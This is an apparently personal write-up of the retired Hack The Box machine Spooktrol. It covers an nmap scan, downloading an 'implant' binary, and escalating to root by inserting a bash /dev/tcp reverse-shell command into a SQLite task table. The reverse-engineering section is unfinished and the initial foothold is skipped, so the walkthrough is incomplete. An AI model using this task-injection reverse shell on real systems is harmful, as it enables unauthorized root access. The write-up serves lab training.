# Spooktrol

This is the write-up for the box Spooktrol that got retired at the 26th October 2021.
My IP address was 10.10.14.2 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.123    spooktrol.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/spooktrol.nmap 10.10.11.123
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp   open  http    uvicorn
|_http-title: Site doesn't have a title (application/json).               
|_http-server-header: uvicorn
| http-robots.txt: 1 disallowed entry
|_/file_management/?file=implant
| fingerprint-strings:
|   FourOhFourRequest:
(...)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 1677768a65a3db231121666ee4c3f232 (RSA)
|   256 6192eb7aa914d76051000c4421a26108 (ECDSA)
|_  256 75c1969c69aac874ef4f72bd6253e94c (ED25519
```

## Checking HTTP (Port 80)

According to the scan, the web server is running on [uvicorn](https://www.uvicorn.org/), which is an **ASGI (Asynchronous Server Gateway Interface)** web server implementation written in **Python**.
The website is a JSON API and has one object:
```
auth: "1ee972476b15c93de27115868a30e75a"
```

The initial scan found the _robots.txt_ file, which has one entry to the directory _/file_management/?file=implant_.
It outputs binary data, so the _implant_ file can be downloaded for further analysis:
```
curl 'http://10.10.11.123/file_management/?file=implant' -o implant
```

The `file` command recognizes it as an **ELF binary**:
```
file implant

implant: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=ce05777839d03f0df9cfcc82f20c437dd55e645e, with debug_info, not stripped
```

### Reverse Engineering Binary

Dynamic analysis by executing the binary:
```
./implant
```

> Executing resolves in a Segmentation Fault, which should not happen so I cannot proceed.
> TBD

## Privilege Escalation

In the root directory is a _.dockerenv_ file, which means that this is a **Docker container** we have to break out of.

The web application is in the directory _/opt/spook2_ and in there is a **SQLite database**:
```
sqlite3 sql_app.db
```

Checking tables of the database:
```
sqlite> .schema
```

Enumerating the table _sessions_:
```
sqlite> select * from sessions;

1|10a6dd5dde6094059db4d23d7710ae12|spooktrol
```

Enumerating the table _tasks_:
```
sqlite> select * from tasks;

1|10a6dd5dde6094059db4d23d7710ae12|1|1|whoami||root
```

This is the same ID and when enumerating the table _checkins_ for this string, it shows that the user root executes `whoami` every two minutes:
```
sqlite> select * from checkins where session == '10a6dd5dde6094059db4d23d7710ae12';
```

The command can be found in the database and can be modified to execute a reverse shell:
```
sqlite> .dump tasks
```
```
sqlite> INSERT INTO tasks VALUES(2,'10a6dd5dde6094059db4d23d7710ae12',0,1,'bash -c "bash -i >& /dev/tcp/10.10.14.2/9001 0>&1"','','');
```

After two minutes, it will execute the command and the listener on my IP and port 9001 starts a reverse shell as root!
